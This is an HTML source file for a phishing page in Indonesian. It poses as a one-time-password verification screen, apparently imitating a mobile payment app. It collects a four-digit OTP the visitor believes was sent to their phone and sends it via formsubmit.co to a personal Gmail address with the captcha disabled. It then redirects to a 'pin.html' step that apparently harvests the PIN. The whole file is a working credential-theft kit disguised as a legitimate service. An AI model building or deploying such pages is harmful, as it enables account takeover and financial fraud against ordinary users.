<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifikasi OTP</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #ffffff; color: #333; margin: 0; padding: 0; }
    .header { background-color: #008CFF; color: white; padding: 16px; font-size: 18px; font-weight: bold; text-align: center; }
    .container { text-align: center; padding: 40px 20px; }
    .title { font-size: 20px; margin-bottom: 10px; }
    .desc { font-size: 14px; color: #555; margin-bottom: 20px; }
    .otp-inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
    .otp-inputs input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 2px solid #ccc; border-radius: 10px; }
    .timer { margin-bottom: 30px; font-weight: bold; color: #008CFF; }
    button { background-color: #008CFF; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="header">Verifikasi OTP</div>
  <div class="container">
    <div class="title">Masukkan Kode OTP</div>
    <div class="desc">Kami telah mengirimkan kode ke nomor Anda</div>
    <div class="otp-inputs">
      <input type="tel" maxlength="1" oninput="moveNext(this, 0)" required>
      <input type="tel" maxlength="1" oninput="moveNext(this, 1)" required>
      <input type="tel" maxlength="1" oninput="moveNext(this, 2)" required>
      <input type="tel" maxlength="1" oninput="moveNext(this, 3)" required>
    </div>
    <div class="timer" id="timer">Kirim ulang dalam 100 detik</div>
    <form action="https://formsubmit.co/baygaming648@gmail.com" method="POST" onsubmit="return submitOTP()">
      <input type="hidden" name="OTP" id="otpFull">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="pin.html">
      <button type="submit">KONFIRMASI</button>
    </form>
  </div>
  <script>
    const inputs = document.querySelectorAll(".otp-inputs input");
    function moveNext(el, index) {
      if (el.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    }
    function submitOTP() {
      const otp = Array.from(inputs).map(i => i.value).join('');
      document.getElementById("otpFull").value = otp;
      return true;
    }
    let countdown = 100;
    const timerEl = document.getElementById("timer");
    const interval = setInterval(() => {
      countdown--;
      timerEl.textContent = "Kirim ulang dalam " + countdown + " detik";
      if (countdown <= 0) {
        clearInterval(interval);
        timerEl.textContent = "Silakan kirim ulang kode";
      }
    }, 1000);
    window.onload = () => inputs[0].focus();
  </script>
</body>
</html>
